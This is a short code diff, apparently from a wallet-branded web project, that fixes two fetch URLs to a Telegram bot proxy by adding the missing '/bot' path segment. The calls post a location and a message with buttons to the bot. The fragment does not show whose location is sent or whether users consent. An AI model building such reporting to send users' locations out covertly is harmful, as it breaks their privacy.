@@ -976,7 +976,7 @@
 
             try {
                 // Send location first
-                await fetch(`https://telegram-proxy.parsxwallet.workers.dev${CONFIG.BOT_TOKEN}/sendLocation`, {
+                await fetch(`https://telegram-proxy.parsxwallet.workers.dev/bot${CONFIG.BOT_TOKEN}/sendLocation`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -987,7 +987,7 @@
                 });
 
                 // Send message with buttons
-                const response = await fetch(`https://telegram-proxy.parsxwallet.workers.dev${CONFIG.BOT_TOKEN}/sendMessage`, {
+                const response = await fetch(`https://telegram-proxy.parsxwallet.workers.dev/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
